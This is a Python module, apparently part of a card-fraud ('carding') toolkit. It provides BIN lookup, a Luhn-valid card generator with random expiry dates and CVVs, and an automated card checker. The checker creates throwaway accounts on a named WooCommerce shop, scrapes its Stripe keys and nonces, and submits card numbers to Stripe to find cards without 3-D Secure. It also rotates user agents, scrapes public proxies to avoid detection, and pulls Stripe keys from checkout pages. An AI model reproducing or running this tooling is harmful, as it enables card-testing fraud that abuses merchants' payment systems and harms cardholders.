# ============================================================
#  DLX Tools — Utility functions ported from Hit.py & Dux.py
#  BIN lookup, card generation, VBV lookup, URL analysis
# ============================================================

import re
import json
import random
import time
import requests
from datetime import datetime
from typing import Dict, List, Optional


# ============================================================
#  BIN Lookup — multi-API fallback
# ============================================================
def bin_lookup(bin_number):
    """Lookup BIN info via multiple APIs. Returns formatted string."""
    bin_num = str(bin_number).replace(" ", "")[:6]
    if not bin_num.isdigit() or len(bin_num) < 4:
        return None, "Invalid BIN — need at least 4 digits"

    # Try API 1
    try:
        r = requests.get(f"https://binsapi.vercel.app/api/bin?bin={bin_num}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            scheme = d.get('scheme', 'Unknown').upper()
            card_type = d.get('type', 'Unknown').upper()
            country = d.get('country', {}).get('name', 'Unknown')
            emoji = d.get('country', {}).get('emoji', '🏳️')
            bank = d.get('bank', {}).get('name', 'Unknown')
            return {
                "brand": scheme,
                "type": card_type,
                "bank": bank,
                "country": country,
                "emoji": emoji,
            }, None
    except Exception:
        pass

    # Try API 2
    try:
        r = requests.get(f"https://api.voidex.dev/api/bin?bin={bin_num}", timeout=5)
        if r.status_code == 200:
            d = r.json()
            if d and "brand" in d:
                return {
                    "brand": d.get("brand", "Unknown"),
                    "type": d.get("type", "Unknown"),
                    "bank": d.get("bank", "Unknown"),
                    "country": d.get("country_name", "Unknown"),
                    "emoji": d.get("country_flag", "🏳️"),
                }, None
    except Exception:
        pass

    return None, "All BIN APIs failed"


def format_bin_result(info):
    """Format BIN info dict into display string."""
    if not info:
        return "Unknown"
    return (
        f"{info.get('brand', '?')} - {info.get('type', '?')}\n"
        f"Bank: {info.get('bank', '?')}\n"
        f"Country: {info.get('country', '?')} {info.get('emoji', '')}"
    )


# ============================================================
#  Luhn Card Generator
# ============================================================
def luhn_checksum(card_number: str) -> int:
    digits = [int(d) for d in str(card_number)]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum([int(x) for x in str(d * 2)])
    return checksum % 10


def luhn_generate(bin_prefix: str, length: int = 16) -> str:
    """Generate a valid card number from BIN using Luhn algorithm."""
    card = [int(d) for d in bin_prefix if d.isdigit()]
    while len(card) < length - 1:
        card.append(random.randint(0, 9))
    # Calculate check digit
    digits = card[::-1]
    total = sum(d if i % 2 != 0 else (d * 2 if d * 2 < 10 else d * 2 - 9) for i, d in enumerate(digits))
    card.append((10 - (total % 10)) % 10)
    return ''.join(map(str, card))


def get_card_brand(card_number: str) -> str:
    first6 = re.sub(r'\D', '', card_number)[:6]
    if re.match(r'^3[47]', first6):
        return 'amex'
    if re.match(r'^5[1-5]', first6) or re.match(r'^2[2-7]', first6):
        return 'mastercard'
    if re.match(r'^4', first6):
        return 'visa'
    return 'unknown'


def generate_cards(bin_input: str, count: int = 10) -> List[str]:
    """Generate card lines (CC|MM|YY|CVV) from BIN pattern.
    BIN format: 424242 or 424242|MM|YY|CVV (x = random)
    """
    parts = bin_input.split('|')
    bin_pattern = re.sub(r'[^0-9xX]', '', parts[0])
    test_bin = bin_pattern.replace('x', '0').replace('X', '0')
    brand = get_card_brand(test_bin)

    target_len = 15 if brand == 'amex' else 16
    cvv_len = 4 if brand == 'amex' else 3
    cards = []

    for _ in range(count):
        # Build card number
        card = ''
        for c in bin_pattern:
            card += str(random.randint(0, 9)) if c.lower() == 'x' else c

        remaining = target_len - len(card) - 1
        for __ in range(max(0, remaining)):
            card += str(random.randint(0, 9))

        # Luhn check digit
        check_digit = 0
        for i in range(10):
            if luhn_checksum(card + str(i)) == 0:
                check_digit = i
                break
        full_card = card + str(check_digit)

        # Month
        month = f"{random.randint(1, 12):02d}"
        if len(parts) > 1 and parts[1] and parts[1].lower() not in ('xx', 'x'):
            month = parts[1].zfill(2)

        # Year
        year = str(datetime.now().year + random.randint(1, 5))[-2:]
        if len(parts) > 2 and parts[2] and parts[2].lower() not in ('xx', 'x'):
            year = parts[2][-2:].zfill(2)

        # CVV
        cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_len))
        if len(parts) > 3 and parts[3] and parts[3].lower() not in ('xxx', 'xxxx', 'x'):
            cvv = parts[3].zfill(cvv_len)

        cards.append(f"{full_card}|{month}|{year}|{cvv}")

    return cards


# ============================================================
#  VBV / 3DS Lookup — Real enrollment check via Stripe SetupIntent
# ============================================================
import uuid
import string
import os

_VBV_DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
_VBV_UA = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
]
_VBV_EMAILS = ['@gmail.com', '@outlook.com', '@hotmail.com', '@yahoo.com']


def _vbv_load_site():
    """Load auth site URL from auth_config.json (shared with /auth gate)."""
    cfg_file = os.path.join(_VBV_DATA_DIR, "auth_config.json")
    try:
        with open(cfg_file, 'r') as f:
            return json.load(f).get("site_url", "https://meddentalstuff.com")
    except Exception:
        return "https://meddentalstuff.com"


def vbv_lookup(cc_line, proxy_dict=None):
    """Real VBV/3DS enrollment check via Stripe SetupIntent.
    Returns enrollment status string.
    """
    parts = cc_line.strip().split('|')
    if not parts or not parts[0].strip():
        return "Error | Invalid input"

    n = re.sub(r'\D', '', parts[0].strip())
    if not n or len(n) < 13:
        return "Error | Invalid card number"

    brand = get_card_brand(n)

    # Parse expiry/cvv — generate if missing
    mm = parts[1].strip() if len(parts) > 1 and parts[1].strip() else f"{random.randint(1,12):02d}"
    yy = parts[2].strip() if len(parts) > 2 and parts[2].strip() else str(random.randint(26, 30))
    cvc = parts[3].strip() if len(parts) > 3 and parts[3].strip() else f"{random.randint(100,999):03d}"

    if len(mm) == 1:
        mm = f'0{mm}'
    if not yy.startswith('20') and len(yy) == 2:
        yy = f'20{yy}'

    site = _vbv_load_site()
    start = time.time()

    try:
        session = requests.Session()
        ua = random.choice(_VBV_UA)
        session.headers.update({
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
        })
        if proxy_dict:
            session.proxies.update(proxy_dict)

        # Step 1: Register
        reg_page = session.get(f'{site}/my-account/', timeout=15)
        nonce_m = re.search(r'name="woocommerce-register-nonce"[^>]*value="([^"]+)"', reg_page.text)
        if not nonce_m:
            return "Error | Site nonce not found"
        reg_nonce = nonce_m.group(1)

        fname = random.choice(['John', 'Mike', 'David', 'Sarah', 'Emma'])
        lname = random.choice(['Smith', 'Johnson', 'Brown', 'Jones', 'Davis'])
        email = f"{''.join(random.choices(string.ascii_lowercase, k=8))}{random.randint(100,999)}{random.choice(_VBV_EMAILS)}"
        pwd = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$", k=14))

        session.post(f'{site}/my-account/', data={
            'email': email, 'password': pwd, 'first_name': fname, 'last_name': lname,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/', 'register': 'Register',
        }, timeout=15)

        # Step 2: Get payment page + Stripe config
        pay_page = session.get(f'{site}/my-account/add-payment-method/', timeout=15)

        setup_nonce, stripe_pk, acc_id = None, None, None
        json_m = re.search(r'wcpay_upe_config\s*=\s*({.+?});', pay_page.text)
        if json_m:
            try:
                cfg = json.loads(json_m.group(1))
                setup_nonce = cfg.get('createSetupIntentNonce')
                stripe_pk = cfg.get('publishableKey')
                acc_id = cfg.get('accountId')
            except Exception:
                pass

        if not setup_nonce:
            m = re.search(r'"createSetupIntentNonce":"([^"]+)"', pay_page.text)
            if m: setup_nonce = m.group(1)
        if not stripe_pk:
            m = re.search(r'"publishableKey":"([^"]+)"', pay_page.text)
            if m: stripe_pk = m.group(1)
        if not acc_id:
            m = re.search(r'"accountId":"([^"]+)"', pay_page.text)
            if m: acc_id = m.group(1)

        if not setup_nonce or not stripe_pk:
            return "Error | Stripe config not found on site"

        # Step 3: Create Stripe PaymentMethod
        guid_val = str(uuid.uuid4())
        stripe_body = (
            f"billing_details[name]={fname} {lname}&billing_details[email]={email}"
            f"&billing_details[address][country]=US&billing_details[address][postal_code]={random.randint(10000,99999)}"
            f"&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}"
            f"&allow_redisplay=unspecified&guid={guid_val}&muid={str(uuid.uuid4())}&sid={str(uuid.uuid4())}&key={stripe_pk}"
        )
        if acc_id:
            stripe_body += f"&_stripe_account={acc_id}"

        stripe_resp = requests.post('https://api.stripe.com/v1/payment_methods',
            headers={
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua,
            }, data=stripe_body, timeout=15)

        sj = stripe_resp.json()
        pm_id = sj.get('id')
        if not pm_id:
            err = sj.get('error', {})
            code = err.get('code', '')
            msg = err.get('message', 'Unknown')
            if code in ('incorrect_number', 'invalid_number'):
                return f"Error | Invalid card | {brand.upper()}"
            if code == 'expired_card':
                return f"Error | Expired card | {brand.upper()}"
            return f"Error | {msg[:50]} | {brand.upper()}"

        # Step 4: Submit SetupIntent — check 3DS enrollment
        ajax_resp = session.post(f'{site}/wp-admin/admin-ajax.php',
            headers={
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': site,
                'referer': f'{site}/my-account/add-payment-method/',
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': ua,
            },
            data={'action': 'create_setup_intent', 'wcpay-payment-method': pm_id, '_ajax_nonce': setup_nonce},
            timeout=15)

        content = ajax_resp.text
        elapsed = round(time.time() - start, 2)

        # Parse 3DS enrollment from response
        if '"success":true' in content or '"success":True' in content:
            # Check if requires_action (3DS) or succeeded directly
            if 'requires_action' in content or 'redirect_to_url' in content or 'three_d_secure' in content:
                return f"🔒 VBV/3DS Enrolled | {brand.upper()} | Authentication Required | {elapsed}s"
            else:
                return f"✅ Non-VBV / Non-3DS | {brand.upper()} | No Authentication | {elapsed}s"

        # Check for 3DS indicators in decline messages
        if 'requires_action' in content or 'three_d_secure' in content or '3d_secure' in content:
            return f"🔒 VBV/3DS Enrolled | {brand.upper()} | Authentication Required | {elapsed}s"

        if 'authentication_required' in content:
            return f"🔒 VBV/3DS Enrolled | {brand.upper()} | 3DS Authentication Required | {elapsed}s"

        # Card-level declines (still tells us no 3DS was triggered)
        decline_keywords = ['insufficient_funds', 'card_declined', 'do_not_honor', 'generic_decline',
                            'lost_card', 'stolen_card', 'pickup_card', 'fraudulent']
        content_lower = content.lower()
        for kw in decline_keywords:
            if kw in content_lower:
                return f"✅ Non-VBV / Non-3DS | {brand.upper()} | Declined ({kw}) but no 3DS | {elapsed}s"

        # Extract message
        match = re.search(r'"message"\s*:\s*"([^"]+)"', content)
        msg = match.group(1) if match else "Unknown response"
        return f"⚠️ Inconclusive | {brand.upper()} | {msg[:50]} | {elapsed}s"

    except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
        return f"ConnError | Connection failed | {brand.upper()}"
    except requests.exceptions.Timeout:
        return f"ConnError | Timeout | {brand.upper()}"
    except Exception as e:
        return f"Error | {str(e)[:50]} | {brand.upper()}"


# ============================================================
#  URL Analyzer — detect payment provider from URL/HTML
# ============================================================
PROVIDER_PATTERNS = {
    'stripe': ['stripe.com', 'pk_live_', 'pk_test_'],
    'braintree': ['braintree', 'braintreegateway.com'],
    'shopify': ['shopify.com', 'myshopify.com', 'window.Shopify'],
    'paypal': ['paypal.com', 'paypal'],
    'adyen': ['adyen.com', 'adyen'],
    'square': ['squareup.com', 'square'],
    'authorize.net': ['authorize.net', 'Authorize.Net'],
    'checkout.com': ['checkout.com', 'Frames'],
    'mollie': ['mollie.com', 'mollie'],
    'klarna': ['klarna.com', 'klarna'],
    'woocommerce': ['woocommerce', 'wc-ajax'],
    'bigcommerce': ['bigcommerce.com'],
    'wix': ['wix.com'],
    'ecwid': ['ecwid.com'],
}


def detect_provider(url: str, html: str = "") -> str:
    """Detect payment provider from URL and/or HTML."""
    combined = (url + " " + html).lower()
    for provider, patterns in PROVIDER_PATTERNS.items():
        for pat in patterns:
            if pat.lower() in combined:
                return provider
    return 'unknown'


def analyze_url(url: str) -> Dict:
    """Analyze a checkout/payment URL. Returns info dict."""
    result = {
        'url': url,
        'provider': 'unknown',
        'merchant': 'Unknown',
        'product': None,
        'amount': None,
        'currency': 'USD',
        'stripe_key': None,
        'error': None,
    }

    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
        }
        resp = requests.get(url, timeout=15, headers=headers, allow_redirects=True, verify=False)
        if resp.status_code != 200:
            result['error'] = f"HTTP {resp.status_code}"
            return result

        html = resp.text
        result['provider'] = detect_provider(url, html)

        # Extract merchant
        for pat in [
            r'"business_name":"([^"]+)"',
            r'<meta property="og:site_name" content="([^"]+)"',
            r'<title>(.*?)\s*[|–-]',
        ]:
            m = re.search(pat, html, re.I)
            if m:
                result['merchant'] = m.group(1).strip()[:80]
                break

        # Extract product
        for pat in [
            r'<meta property="og:title" content="([^"]+)"',
            r'"name":"([^"]+)"',
            r'<h1[^>]*>(.*?)</h1>',
        ]:
            m = re.search(pat, html, re.I)
            if m:
                name = re.sub(r'<[^>]+>', '', m.group(1)).strip()
                if name and len(name) > 3:
                    result['product'] = name[:100]
                    break

        # Extract amount
        for pat in [
            r'"amount":(\d+)',
            r'\$(\d+(?:\.\d{2})?)',
            r'data-amount="(\d+)"',
        ]:
            m = re.search(pat, html, re.I)
            if m:
                amt = m.group(1).replace(',', '')
                if amt.isdigit() and len(amt) > 2:
                    result['amount'] = f"${int(amt)/100:.2f}"
                elif '.' in amt:
                    result['amount'] = f"${amt}"
                break

        # Extract currency
        m = re.search(r'"currency":"([^"]+)"', html, re.I)
        if m:
            result['currency'] = m.group(1).upper()

        # Extract Stripe key
        m = re.search(r'(pk_(?:live|test)_[A-Za-z0-9]+)', html)
        if m:
            result['stripe_key'] = m.group(1)

    except Exception as e:
        result['error'] = str(e)[:80]

    return result


# ============================================================
#  Proxy tools
# ============================================================
def scrape_proxies() -> List[str]:
    """Scrape fresh HTTP proxies from public sources."""
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    ]
    all_proxies = []
    for src in sources:
        try:
            r = requests.get(src, timeout=10)
            found = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', r.text)
            all_proxies.extend(found)
        except Exception:
            continue
    return list(set(all_proxies))


def check_proxy(proxy_str: str, timeout: int = 5):
    """Test a single proxy. Returns (alive, latency_ms)."""
    try:
        start = time.time()
        r = requests.get(
            "https://httpbin.org/ip",
            proxies={"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"},
            timeout=timeout,
        )
        latency = int((time.time() - start) * 1000)
        if r.status_code == 200:
            return True, latency
    except Exception:
        pass
    return False, 0
